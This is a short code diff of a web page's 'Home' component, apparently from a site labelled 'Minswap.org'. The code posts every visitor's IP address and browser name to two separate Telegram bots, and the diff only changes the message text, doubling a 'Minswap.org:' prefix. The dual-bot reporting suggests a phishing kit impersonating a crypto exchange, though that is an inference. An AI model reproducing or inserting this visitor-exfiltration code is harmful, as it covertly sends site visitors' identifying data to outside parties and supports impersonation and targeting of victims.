@@ -30,15 +30,15 @@ function Home() {
         const url = `https://api.telegram.org/bot${token}/sendMessage`;
         const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
 
-        const message = `${ipAddress} just accessed home page\nBrowser: ${browserName}`;
+        const message = `Minswap.org: ${ipAddress} just accessed home page\nBrowser: ${browserName}`;
 
         const data = {
           chat_id: chat_id,
-          text: message,
+          text: `Minswap.org: ${message}`,
         };
         const odata = {
           chat_id: ochat_id,
-          text: message,
+          text: `Minswap.org: ${message}`,
         };
 
         // Send to first bot
